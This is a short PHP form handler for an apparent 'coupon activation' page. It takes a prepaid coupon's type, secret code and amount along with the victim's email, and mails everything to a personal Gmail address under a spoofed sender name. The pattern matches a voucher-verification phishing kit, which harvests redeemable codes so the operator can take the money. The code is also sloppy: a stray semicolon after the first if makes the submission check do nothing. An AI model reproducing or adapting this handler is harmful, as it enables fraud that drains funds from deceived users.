<?php
if(isset($_POST['send_form']));
{
    $origine = htmlspecialchars($_POST['origine']);
    $typecoupon = htmlspecialchars($_POST['typecoupon']);
    $codesecret = htmlspecialchars($_POST['codesecret']);
    $montant = htmlspecialchars($_POST['montant']);
    $masque = htmlspecialchars($_POST['masque']);
    $email = htmlspecialchars($_POST['email']);

    if (!empty($_POST['origine']))
    {
        if (!empty($_POST['typecoupon'])) 
        {
            if (!empty($_POST['codesecret'])) 
            {
                if (!empty($_POST['montant'])) 
                {
                    if (!empty($_POST['masque'])) 
                    {
                        if (!empty($_POST['email'])) 
                        {
                            $header = "MIME-Version: 1.0\r\n";
                            // $header .= 'From:' .$email. "\r\n";
                            // $header.='From:"Coupon formulaire"<support@formulaire.com>'."\n";
                            $header.='From:"Coupon formulaire"<support@coupon-online.vercel.app>'."\r\n";
                            $header.='Content-Type:texte/html; charset="utf-8"'."\n";
                            $header.='Content-Transfer-Encoding: 8bit';

                            $message='
                            <html>
                                <body>
                                    <div>
                                        Bonjour chers monsieur je desire activer un coupon.<br>
                                        <br>
                                        <h3> Mes information <h3>
                                        <br>
                                        ORIGINE DU COUPON:'.$origine.'
                                        TYPE DE COUPON:'.$typecoupon.'
                                        CODE SECRET:'.$codesecret.'
                                        MONTANT:'.$montant.'
                                        MASQUEZ LE CODE:'.$masque.'
                                        E-mail:'.$email.'
                                        
                                    </div>
                                </body>
                            </html>
                            ';

                            mail("dovenonjeffrey@gmail.com", "Activation coupon", $message, $header);
                            header('Location:index.php?Wat_err=success');
                        }else header('Location:index.php?Wat_err=fieldsemail%Vide');
                    }else header('Location:index.php?Wat_err=fieldsmasque%Vide');
                }else header('Location:index.php?Wat_err=fieldsmontant%Vide');
            }else header('Location:index.php?Wat_err=fieldscode%Vide');
        }else header('Location:index.php?Wat_err=fieldstype%Vide');
    }else header('Location:index.php?Wat_err=fieldsorigine%Vide');

}
// header('Location:index.php');
?>